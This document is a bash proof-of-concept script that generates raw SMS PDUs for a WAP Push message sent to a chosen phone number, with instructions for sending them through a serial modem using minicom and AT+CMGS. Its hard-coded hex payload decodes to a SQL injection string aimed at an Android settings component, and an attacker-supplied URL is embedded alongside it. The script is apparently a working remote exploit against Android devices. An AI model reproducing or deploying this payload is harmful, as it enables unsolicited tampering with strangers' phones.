#!/bin/bash
echo -e "\e[1;34mThis is a POC script that automates the creation of the raw pdus for a WAP message.

This has been tested with a samsung S3 mini as the sending device and should work with devices that provide serial access capability and modems.
Enter the url and target phone number when prompted and you'll get back the pdus and the length to specify when sending.
After that connect to the serial port of your sending device, on linux this should be dev/ttyACM0 or /dev/ttyUSB0 and you can use minicom as follows:

sudo minicom -D /dev/ttyACM0

To send the WAP PUSH message, connect your mobile device to your computers USB port then type:

AT+CMGS=?, where ? is the length you'll get from the output of this script.

Press Enter then copy and paste the pdus you get from the output of this script.
Press Ctrl+Z and you'll get back an OK message if sending is successful.\n\e[0m"


echo -e "Enter the url: "
read TEXT
echo -e "\nEnter the phone number: " 
read NUMBER

NO=`echo ${NUMBER:1:1}${NUMBER:0:1}${NUMBER:3:1}${NUMBER:2:1}${NUMBER:5:1}${NUMBER:4:1}${NUMBER:7:1}${NUMBER:6:1}${NUMBER:9:1}${NUMBER:8:1}`

URL=`perl -e '@a=split(//,unpack("b*","'$TEXT'")); for ($i=7; $i < $a; $i+=8) { $a[$i]="" } print uc(unpack("H*", pack("b*", join("", @a))))."\n"'`

LENGTH="123"

WAPPDU1="0B05040B84C0020003F001010A065603B081EAAF2720756e696f6e2073656c65637420302c27636f6d2e616e64726f69642e73657474696e6773272c27636f6d2e616e64726f69642e73657474696e67732e53657474696e6773272c302c302c302d2d200002066A00850903${URL}0001"
LN0=`echo $((${#WAPPDU1}/2))`
LN1=`printf '%x\n' $LN0`

WAPPDU="0040000A81${NO}0004${LN1}0B05040B84C0020003F001010A065603B081EAAF2720756e696f6e2073656c65637420302c27636f6d2e616e64726f69642e73657474696e6773272c27636f6d2e616e64726f69642e73657474696e67732e53657474696e6773272c302c302c302d2d200002066A00850903${URL}0001"

echo -e "\n\e[1;34mPDUS:\e[0m $WAPPDU"
echo -e "\n\e[1;34mLENGTH:\e[0m $(($LN0+13))\n"